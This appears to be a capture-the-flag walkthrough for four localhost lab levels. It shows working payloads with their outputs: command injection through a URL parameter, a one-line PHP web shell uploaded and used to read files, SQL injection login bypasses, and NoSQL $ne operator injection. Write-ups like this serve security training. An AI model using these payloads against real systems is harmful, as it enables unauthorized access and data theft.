## User 1

The site on http://localhost:81 provides a button that returns the current date\
http://localhost:81/index?exec=date
\
```The current date is: 2024-06-13 11:04:33```

We see a site that is vulnerable to code injection. In this example, a script uses the exec() function to execute the date command. However, the host is dynamic (passed via an HTTP GET request):

http://localhost:81/index?exec=whoami\
```root```

http://localhost:81/index?exec=ls\
```Dockerfile app.py flag.txt templates```

http://localhost:81/index?exec=cat%20flag.txt\
Password for User 2: ```CWA{C0MM4ND_1NJ3CT10N_3XP10ITED}``` 

## User 2
The site provides a file upload form.\
We se that we can upload text files, let’s try to upload a payload script and start the attack. Since we know we are running php, we can use a php "microshell" which allows us to simply add commands we want to run on the webserver at the end of a URL.

We make a php file (```exploit.php```) and write the following code in it \
```<?php system($_REQUEST['cmd']); ?>```

upload the file and see that:\
```You can access it at http://localhost:82/uploads/666adc26283199.74726988.php ```

http://localhost:82/uploads/666adc26283199.74726988.php?cmd=pwd\
```/var/www/html/uploads``` 

http://localhost:82/uploads/666adc26283199.74726988.php?cmd=cd%20..%20;%20ls\
```flag.txt index.php uploads```

http://localhost:82/uploads/666adc26283199.74726988.php?cmd=cat%20../flag.txt\

Password for User 3:```CWA{F1L3_UPLO4D_TURN5_T0_RC3}```

## User 3
The site provides a login form.\
We try to submit different kind of data. For example, consider if the input was ```'```\
The application would crash because the resulting SQL query is incorrect.\
Thats what happens in our case, we get ```Internal Server Error.```

With the knowledge that a single quote causes an error in the application we can expand a little more on SQL Injection.
What if our input was ```' OR 1=1```

We try:\
username: ```whatever' or '1'='1```\
password: ```whatever' or '1'='1```\
the result is: ```Welcome, codwer:Welc0m3T0Codw3r!```

We see that there is the user ```codwer```, maybe there is also user ```admin```:\
username: ```admin' or '1'='1```\
password: ```asdasdasdasd```\
the result is: ```Welcome, admin:CWA{SQL_1NJ3C710N_3XP10I7ED}!```\
Password for User 4: ```CWA{SQL_1NJ3C710N_3XP10I7ED}```

## User 4
The site provides a login form. We try to bypass it with a NoSQL injection

We try:\
username:  ```{"$ne": null}```\
password: ```{"$ne": null}```\
The result is: ```{"Id":"666af06fc270fa77189fa36f","Username":"codwer","Password":"Welc0m3T0Codw3r"}```\

Then we try:\
username: ```admin```\
password: ```{"$ne": null}```\
The result is: ```{"Id":"666af06fc270fa77189fa370","Username":"admin","Password":"CWA{N0SQL_INJ3CT10N_15_4LM05T_TH3_S4M3}"}```\

Password for root: ```CWA{N0SQL_INJ3CT10N_15_4LM05T_TH3_S4M3}```